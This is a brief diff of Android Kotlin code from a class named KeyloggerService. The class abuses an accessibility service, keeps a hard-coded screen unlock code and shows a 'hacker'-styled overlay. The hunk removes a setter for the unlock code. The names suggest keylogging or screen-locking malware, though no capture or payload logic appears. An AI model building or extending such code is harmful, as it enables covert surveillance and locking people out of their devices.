@@ -27,7 +27,6 @@ class KeyloggerService : AccessibilityService() {
         @Volatile var unlockCode: String = "2719"
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun hideScreenInject()   { instance?.hideOverlay() }
-        fun setUnlockCode(code: String) { unlockCode = code }
         fun resetUnlockCode()    { unlockCode = "2719" }
     }
 
